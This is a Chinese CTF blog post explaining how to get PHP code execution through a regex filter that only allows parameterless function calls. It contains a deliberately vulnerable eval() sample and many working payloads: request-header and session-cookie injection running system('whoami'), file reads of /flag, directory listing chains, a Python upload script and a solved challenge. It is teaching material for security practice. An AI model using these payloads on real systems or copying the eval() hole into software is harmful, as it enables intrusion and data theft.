@@ -1,0 +1,254 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>无参数rec | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">无参数rec</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/">2022-04-10</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    
+    eval($_GET[&#39;code&#39;]);
+&#125;
+?&gt;
+</code></pre>
+<p>这里使用preg<em>replace替换匹配到的字符为空，\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9</em>]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;<br>以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。</p>
+<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><pre><code class="php">目录操作：
+getchwd() ：函数返回当前工作目录。
+scandir() ：函数返回指定目录中的文件和目录的数组。
+dirname() ：函数返回路径中的目录部分。
+chdir() ：函数改变当前的目录。
+
+数组相关的操作：
+end() - 将内部指针指向数组中的最后一个元素，并输出。
+next() - 将内部指针指向数组中的下一个元素，并输出。
+prev() - 将内部指针指向数组中的上一个元素，并输出。
+reset() - 将内部指针指向数组中的第一个元素，并输出。
+each() - 返回当前元素的键名和键值，并将内部指针向前移动。
+array_shift() - 删除数组中第一个元素，并返回被删除元素的值。
+array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+array_slice() 函数在数组中根据条件取出一段值，并返回。
+array_reverse() 函数返回翻转顺序的数组。
+
+读文件
+show_source() - 对文件进行语法高亮显示。
+readfile() - 输出一个文件。
+highlight_file() - 对文件进行语法高亮显示。
+file_get_contents() - 把整个文件读入一个字符串中。
+readgzfile() - 可用于读取非 gzip 格式的文件
+    
+编码
+chr() 函数从指定的 ASCII 值返回字符。
+hex2bin() — 转换十六进制字符串为二进制字符串。
+</code></pre>
+<h1 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h1><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>**getenv():**获取环境变量的值(在PHP7.1之后可以不给予参数)</p>
+<p>适用于：php7以上的版本</p>
+<p>php7.0以下版本返回bool(false)</p>
+<pre><code>?code=var_dump(getenv());
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235047746.png" alt="image-20220410235047746"></p>
+<p>php7.0以上版本</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235228226.png" alt="image-20220410235228226"></p>
+<p>还可以通过这个打开phpinfo()页面</p>
+<pre><code>?code=var_dump(getenv(phpinfo()));
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235551070.png" alt="image-20220410235551070"></p>
+<h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>**getallheaders:**获取所有 HTTP 请求标头，是apache_request_headers()的别名函数，但是该函数只能在Apache环境下使用</p>
+<pre><code>?code=print_r(getallheaders());
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235935581.png" alt="image-20220410235935581"></p>
+<p><strong>payload1</strong></p>
+<pre><code>?code=eval(reset(getallheaders()));
+# post中增加请求头
+flag: system(&#39;whoami&#39;);
+</code></pre>
+<p>在我的burp中经过测试，设置的请求头跑到了最前面，这个问题我也很奇怪，网上流传的是取最后一个头，那我这里就取第一个吧。</p>
+<p>测试一下，在这里添加请求头</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000647293.png" alt="image-20220411000647293"></p>
+<p>输出一下第一个请求头</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000715021.png" alt="image-20220411000715021"></p>
+<p>我们发现我们构造的请求头在最开始，那么我们就可以构造出payload。其实在开头还是结尾，问题都不大，灵活变通即可。</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001023643.png" alt="image-20220411001023643"></p>
+<p><strong>payload2</strong></p>
+<p>在php7以上的版本使用</p>
+<pre><code>?code=eval(end(apache_request_headers()));
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001253812.png" alt="image-20220411001253812"></p>
+<h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p><strong>get_defined_vars():</strong></p>
+<pre><code>返回由所有已定义变量所组成的数组，会返回$_GET,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;files
+</code></pre>
+<p><strong>current:</strong></p>
+<pre><code>返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值
+</code></pre>
+<p><strong>payload1</strong></p>
+<pre><code>?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#39;whoami&#39;);
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001923627.png" alt="image-20220411001923627"></p>
+<p><strong>payload2</strong></p>
+<pre><code>?flag=system(&#39;whoami&#39;);&amp;code=eval(reset(current(get_defined_vars())));
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002114740.png" alt="image-20220411002114740"></p>
+<p><strong>payload3</strong></p>
+<pre><code>?flag=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));
+</code></pre>
+<p><strong>pos函数:</strong></p>
+<pre><code>pos()是PHP中的内置函数，用于返回内部指针当前指向的数组中元素的值。返回值后，pos()函数不会递增或递减内部指针。
+</code></pre>
+<p>解释下这个payload</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002640375.png" alt="image-20220411002640375"></p>
+<p>我们发现flag的值是被嵌套在两个数组中，因此如果要取出flag的值，要执行两次pos</p>
+<p>第一次pos：</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002803950.png" alt="image-20220411002803950"></p>
+<p>第二次pos：</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002837861.png" alt="image-20220411002837861"></p>
+<p>成功取出，加上eval函数就可以执行了</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002921084.png" alt="image-20220411002921084"></p>
+<p><strong>payload4</strong></p>
+<pre><code class="python">import requests
+files = &#123;
+   &quot;system(&#39;whoami&#39;);&quot;: &quot;&quot;
+&#125;
+#data = &#123;
+#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;
+#&#125;
+r = requests.post(&#39;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;, files=files)
+print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))
+</code></pre>
+<p><code>而如果网站对$_GET,$_POST,$_COOKIE都做的过滤， 那我们只能从$_FILES入手了，file数组在最后一个，需要end定位，然后pos两次定位获得文件名</code></p>
+<h2 id="session-start-函数"><a href="#session-start-函数" class="headerlink" title="session_start()函数"></a>session_start()函数</h2><p>适用于：php7以下的版本</p>
+<p><strong>session_start()</strong></p>
+<pre><code>启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()
+</code></pre>
+<p><strong>session_id()</strong></p>
+<pre><code>获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）
+</code></pre>
+<p>可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。</p>
+<p>但其有限制：</p>
+<p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p>
+<p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p>
+<p><strong>hex2bin()</strong></p>
+<pre><code>转换16进制字符串为二进制字符串
+</code></pre>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>payload</p>
+<pre><code>?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1
+Cookie: PHPSESSID=73797374656d282777686f616d6927293b  # system(&#39;whoami&#39;);
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411010515707.png" alt="image-20220411010515707"></p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code> show_source(session_id(session_start()));
+ var_dump(file_get_contents(session_id(session_start())));
+ highlight_file(session_id(session_start()));
+ readfile(session_id(session_start()));
+ 然后抓包传入Cookie: PHPSESSID=(想读的文件)即可
+</code></pre>
+<p>payload</p>
+<pre><code>GET /1.php?code=show_source(session_id(session_start())); HTTP/1.1
+Cookie: PHPSESSID=/flag
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/20220109194247-442d62d6-7141-1.png" alt="img"></p>
+<p>这种方法我并没有测试成功，先写下来吧。</p>
+<h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h2><p><strong>查看当前目录文件名</strong></p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011259622.png" alt="image-20220411011259622"></p>
+<p>文件读取</p>
+<p><strong>读取当前目录文件</strong></p>
+<pre><code>当前目录倒数第一位文件：
+show_source(end(scandir(getcwd())));
+show_source(current(array_reverse(scandir(getcwd()))));
+
+当前目录倒数第二位文件：
+show_source(next(array_reverse(scandir(getcwd()))));
+
+随机返回当前目录文件：
+highlight_file(array_rand(array_flip(scandir(getcwd()))));
+show_source(array_rand(array_flip(scandir(getcwd()))));
+show_source(array_rand(array_flip(scandir(current(localeconv())))));
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011558669.png" alt="image-20220411011558669"></p>
+<p>多试几次</p>
+<p><strong>查看上一级目录文件名</strong></p>
+<pre><code>print_r(scandir(dirname(getcwd())));
+print_r(scandir(next(scandir(getcwd()))));
+print_r(scandir(next(scandir(getcwd()))));
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011321325.png" alt="image-20220411011321325"></p>
+<p>函数解释</p>
+<pre><code>array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。
+array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。
+array_flip()和array_rand()配合使用可随机返回当前目录下的文件名
+dirname(chdir(dirname()))配合切换文件路径
+</code></pre>
+<p><strong>查看和读取根目录文件</strong></p>
+<p>所获得的字符串第一位有几率是/，需要多试几次</p>
+<pre><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011343731.png" alt="image-20220411011343731"></p>
+<h1 id="ctf题目讲解"><a href="#ctf题目讲解" class="headerlink" title="ctf题目讲解"></a>ctf题目讲解</h1><h2 id="NoRce"><a href="#NoRce" class="headerlink" title="NoRce"></a>NoRce</h2><p>源码：</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$exp = $_GET[&#39;exp&#39;];
+//php7.3 + Apache
+if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)) &#123;
+    if(!preg_match(&quot;/o|v|b|print|var|time|file|sqrt|path|dir|exp|pi|an|na|en|ex|et|na|dec|true|false|[0-9]/i&quot;, $exp))&#123;
+        eval($exp);
+    &#125;else&#123;
+        exit(&#39;NoNoNo,U R Hacker~&#39;);
+    &#125;
+&#125;else&#123;
+    exit(&quot;What&#39;s this?&quot;);
+&#125;
+?&gt;
+</code></pre>
+<p>过滤相当严格</p>
+<p>测试一下，发现</p>
+<pre><code>apache_request_headers();
+</code></pre>
+<p>没有被过滤</p>
+<p>我们还可以利用其它几个没有被过滤的函数构造payload</p>
+<pre><code>die() 函数输出一条消息，并退出当前脚本
+array_shift() - 删除数组中第一个元素，并返回被删除元素的值
+</code></pre>
+<p>在我的电脑中，需要把flag头，放在host前，具体原因未知</p>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013150830.png" alt="image-20220411013150830"></p>
+<p>此时arry_shift()返回的值就是我们要执行的命令</p>
+<p>payload</p>
+<pre><code>?exp=system(array_shift(apache_request_headers()));
+# post
+flag: whoami
+</code></pre>
+<p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013259840.png" alt="image-20220411013259840"></p>
+<p>成功执行命令</p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/">https://sakurahack-y.github.io/2022/04/10/无参数rec/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">代码执行</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">关键函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#getenv"><span class="toc-number">3.1.</span> <span class="toc-text">getenv()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getallheaders"><span class="toc-number">3.2.</span> <span class="toc-text">getallheaders()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">3.3.</span> <span class="toc-text">get_defined_vars()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session-start-%E5%87%BD%E6%95%B0"><span class="toc-number">3.4.</span> <span class="toc-text">session_start()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.4.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.4.2.</span> <span class="toc-text">文件读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#scandir"><span class="toc-number">3.5.</span> <span class="toc-text">scandir</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf%E9%A2%98%E7%9B%AE%E8%AE%B2%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">ctf题目讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NoRce"><span class="toc-number">4.1.</span> <span class="toc-text">NoRce</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/">浅学javascript &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
